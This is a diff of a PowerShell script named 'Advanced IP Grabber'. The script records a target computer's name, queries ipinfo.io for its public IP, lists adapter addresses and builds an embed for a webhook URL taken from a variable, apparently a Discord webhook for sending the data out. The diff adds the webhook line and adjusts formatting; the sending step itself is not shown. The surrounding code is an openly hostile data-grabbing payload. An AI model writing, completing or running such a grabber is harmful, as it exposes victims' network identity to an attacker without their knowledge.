@@ -1,7 +1,8 @@
+$webHookUrl = "$dc"
 $title = "Advanced IP Grabber"
 $targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
 $description = "Target: **$targetPC**"
-$color = "FF8200"
+$color = '16744960'
 
 
 
@@ -14,6 +15,7 @@ $fields = @()
 # Add the public IP to the fields array
 try{$publicIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
 catch{$publicIP="Error getting Public IP"}
+
 $fields += @{ name = "Public IP"; value = "*" + $publicIP + "*" }
 
 # Iterate through the adapters
@@ -36,8 +38,8 @@ foreach ($adapter in $ipConfig.IPv4Address) {
 $embed = @{
     title       = $title
     description = $description
-    fields      = $fields
     color       = $color
+    fields      = $fields
 }
 
 $payload = @{
